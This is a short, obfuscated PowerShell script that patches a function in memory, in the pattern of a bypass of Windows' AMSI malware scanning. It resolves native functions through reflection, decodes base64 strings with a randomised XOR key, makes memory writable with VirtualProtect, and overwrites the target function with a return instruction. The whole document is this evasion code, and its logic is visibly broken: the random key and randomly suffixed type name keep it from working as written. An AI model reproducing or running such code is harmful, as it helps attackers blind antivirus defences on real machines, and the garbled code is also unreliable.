function X-Resolve {
    Param ($m, $f)
    $r = Get-Random -Minimum 1000 -Maximum 9999
    $a = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location -match "System\.dll$" }
    $b = $a.GetType("Microsoft.Win32.UnsafeNativeMethods$r")
    $c = $b.GetMethods() | Where-Object { $_.Name -eq "GetProcAddress" } | Select-Object -First 1
    $d = $b.GetMethod("GetModuleHandle")
    $h = $d.Invoke($null, @($m))
    return $c.Invoke($null, @($h, $f))
}

function X-Delegate {
    Param ($p, $r = [Void])
    $n = Get-Random -Minimum 1000 -Maximum 9999
    $asm = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("DynAsm$n")), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $mod = $asm.DefineDynamicModule("DynMod$n", $false)
    $typ = $mod.DefineType("DynDel$n", "Class, Public, Sealed, AnsiClass, AutoClass", [System.MulticastDelegate])
    $typ.DefineConstructor("RTSpecialName, HideBySig, Public", [System.Reflection.CallingConventions]::Standard, $p).SetImplementationFlags("Runtime, Managed")
    $typ.DefineMethod("Invoke", "Public, HideBySig, NewSlot, Virtual", $r, $p).SetImplementationFlags("Runtime, Managed")
    return $typ.CreateType()
}

function X-Decrypt {
    Param ($s)
    $k = [System.Text.Encoding]::UTF8.GetBytes("xai_key_" + (Get-Random -Minimum 100 -Maximum 999))
    $b = [System.Convert]::FromBase64String($s)
    for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = [Byte]($b[$i] -bxor $k[$i % $k.Length]) }
    return [System.Text.Encoding]::UTF8.GetString($b)
}

Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)

$m1 = "YVprNUJvbGw=" 
$m2 = "QWpzaVNjZm5CdWZmZXI=" 
$m3 = "a2VybmVsMzIuZGxs" 
$m4 = "VmlydHVhbFByb3RlY3Q=" 

$addr = X-Resolve (X-Decrypt $m1) (X-Decrypt $m2)
$vpAddr = X-Resolve (X-Decrypt $m3) (X-Decrypt $m4)
$del = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpAddr, (X-Delegate @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$prot = 0
$del.Invoke($addr, 5, 0x40, [ref]$prot) | Out-Null
$patch = [Byte[]]@(0xC3, 0x90, 0x90, 0x90, 0x90)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 5) | Out-Null